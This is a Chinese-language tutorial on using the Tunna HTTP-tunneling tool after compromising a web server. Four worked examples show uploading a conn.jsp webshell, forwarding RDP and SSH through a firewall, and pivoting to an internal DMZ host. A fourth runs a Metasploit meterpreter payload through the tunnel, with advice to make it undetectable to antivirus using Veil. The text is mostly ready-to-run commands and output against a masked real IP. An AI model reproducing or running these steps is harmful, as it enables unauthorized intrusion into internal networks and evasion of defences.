# tunna工具使用实例

### 原理:就是个HTTP tunneling工具

```
 +-------------------------------------------+                     +-------------------------------------------+
 | Local Host                                |                     | Remote Host                               |
 |-------------------------------------------|                     |-------------------------------------------|
 |   +----------+       +------------+       |   +-------------+   |   +------------+        +----------+      |
 |   |Client App|+----->|Local Proxy |<==========|  Firewall   |======>|  Webshell  |+------>|Server App|      |
 |   +----------+       +------------+       |   +-------------+   |   +------------+        +----------+      |
 +-------------------------------------------+                     +------------------------------------------ +

```

可以看出该工具先使用proxy.py监听本地一个端口,然后连接部署在远程WEB的webshell,远端的webshell会把端口转发请求转发到本地或者本地内网远程的主机,从而实现HTTP tunneling.这对于内网入侵来说,是很有用的一个工具.

该工具看起来是不是有似曾相识的感觉,恩.其实和reduh原理是一样的,不过tunna更稳定,速度更快.

下载地址是:[http://www.secforce.com/media/tools/tunna_v0.1.zip](http://www.secforce.com/media/tools/tunna_v0.1.zip)

下面讲解4个实例,就能掌握该工具使用方法了.

### 实例1:

网站对外只开放了80端口,其他的端口都是关闭的,通过CVE-2013-225得到JSP的WEBSHELL后,上传conn.jsp,做转发,实现连接本机的其他端口.

直接扫描发现3389是关闭的

```
mickey@pentest:~# nmap -sS -p3389 219.x.x.x

Starting Nmap 6.40 ( http://nmap.org ) at 2013-09-26 22:47 EDT
Nmap scan report for 219.x.x.x
Host is up (0.0088s latency).
PORT     STATE SERVICE
3389/tcp close  

```

通过webshell上传conn.jsp到主机上,本地开始连接

```
python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 3389 -v

```

参数含义如下:

```
-l 表示本地监听的端口
-r 远程要转发的端口
-v 详细模式

```

然后本地执行

```
rdesktop 127.0.0.1:1234

```

就可以连接到目标的3389了

![如图1](http://drops.javaweb.org/uploads/images/d6b0cf1c7988e25be58f89255be1f3505a57c336.jpg)

### 实例2:

对于有些服务,比如SSH,还需要添加-s参数,才能保证连接的时候不会中断.

```
python proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -r 22 -v -s





ssh localhost -p 1234

```

![enter image description here](http://drops.javaweb.org/uploads/images/3e0203b27ae746c2ae8f22512052cd2af25940ba.jpg)

### 实例3:

场景:已经得到DMZ区的一台主机的JSPSHELL,该主机的内网IP是172.16.100.20,通过查点,发现DMZ区还有其他的主机(172.16.100.20),并且开放了3389,我们想利用HTTP tunneling,连接到172.16.100.20的3389,命令如下

```
python2.7 proxy.py -u http://219.x.x.x/conn.jsp -l 1234 -a 172.16.100.20 -r 3389

```

这里多了一个-a参数,意义是要转发的IP

### 实例4:

对于喜欢metasploit的朋友,该工具也支持,不过如果对方有杀软的话,建议先用veil做好meterpreter的免杀.

首先把tunna_exploit.rb拷贝到msf的modules/exploits/windows/misc目录.

```
cp ~/tunna_exploit.rb /root/metasploit-framework/modules/exploits/windows/misc

```

然后开始利用

```
msf > use exploit/windows/misc/tunna_exploit
msf exploit(tunna_exploit) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/bind_tcp
msf exploit(tunna_exploit) > set RHOST 1.3.3.7  <-- 注意这里是指本地的公网IP
RHOST => 1.3.3.7
msf exploit(tunna_exploit) > set TARGETURI http://219.x.x.x:8080/conn.jsp
TARGETURI => http://219.x.x.x:8080/conn.jsp
msf exploit(tunna_exploit) > set VERBOSE true
VERBOSE => true
msf exploit(tunna_exploit) > exploit -j

```

tunna除了支持jsp还支持以下环境和脚本

conn.jsp Tested on Apache Tomcat (windows + linux) conn.aspx Tested on IIS 6+8 (windows server 2003/2012) conn.php Tested on LAMP + XAMPP + IIS (windows + linux)

使用的时候需要注意:metasploit里的脚本只对应metasploit使用.